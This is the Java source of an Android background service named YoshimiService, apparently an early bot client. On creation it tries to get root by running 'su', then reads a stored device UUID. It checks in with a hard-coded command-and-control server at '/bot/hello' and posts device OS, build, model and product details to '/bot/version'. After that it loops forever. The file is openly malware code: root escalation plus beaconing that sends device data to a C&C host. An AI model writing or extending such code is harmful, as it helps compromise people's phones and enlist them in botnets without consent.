package com.redactedlabs.yoshimi;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.util.Log;

public class YoshimiService extends Service {
	
	private static final String TAG = "YoshimiService";
	private static final String CC_SERVER = "http://192.168.1.161:8888";
	private SQLite sqlite;
	private Process proc;
	private String uuid;
	
	@Override
	public void onCreate() {
		Log.d(TAG, "Yoshimi Service created");
		getRoot();
		sqlite = new SQLite(this);
		String query = "SELECT * FROM storage WHERE name = ?";
		Cursor cursor =  sqlite.getReadableDatabase().rawQuery(query, new String[] { "uuid" });
		if (cursor.getCount() == 1) {
			cursor.moveToFirst();
			uuid = cursor.getString(cursor.getColumnIndex("value"));
			Log.d(TAG, "Got uuid from db: " + uuid);
		} else {
			Integer count = cursor.getCount();
			Log.e(TAG, "UUID query returned " + count.toString() + "result(s)");
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		mainLoop();
		Log.e(TAG, "Main loop ended?!?");
		return 0;
	}
	
	private void getRoot() {
		try {
			proc = Runtime.getRuntime().exec("su");
			try {
				proc.waitFor();
				if (proc.exitValue() != 255) {
					Log.d(TAG, "Successfully acquired root priviledges!");
				} else {
					Log.d(TAG, "Failed to acquire root priviledges.");
				}
			} catch (InterruptedException error) {
				Log.e(TAG, "Interrupted while attempting to get root: " + error.toString());
			}
		} catch (IOException error) {
			Log.e(TAG, "I/O Error while attempting to get root: " + error.toString());
		}
	}
	
	private void mainLoop() {
		Log.d(TAG, "Starting main loop...");
		String getResponse = Http.GET(CC_SERVER+"/bot/hello", URLEncoder.encode(uuid));
		Log.d(TAG, "Yoshimi C&C (GET): " + getResponse);
		String postResponse = Http.POST(CC_SERVER+"/bot/version", URLEncoder.encode(uuid), getVersionInformation());
		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
		while (true) {
			sleep();
			Log.d(TAG, "Still alive!");
		}
	}
	
	private List<NameValuePair> getVersionInformation() {
		Log.d(TAG, "Gathering version information ...");
		List<NameValuePair> details = new ArrayList<NameValuePair>();
		details.add(new BasicNameValuePair("os_version", System.getProperty("os.version")));
		details.add(new BasicNameValuePair("build_version", android.os.Build.VERSION.INCREMENTAL));
		details.add(new BasicNameValuePair("sdk_version", android.os.Build.VERSION.SDK));
		details.add(new BasicNameValuePair("device", android.os.Build.DEVICE));
		details.add(new BasicNameValuePair("model", android.os.Build.MODEL));
		details.add(new BasicNameValuePair("product", android.os.Build.PRODUCT));
		return details;
	}

	private void sleep() {
		try {
			Thread.sleep(5000);
		} catch (InterruptedException error) {
			Log.d(TAG, "Sleep threw an exception: " + error.toString());
		}
	}
}
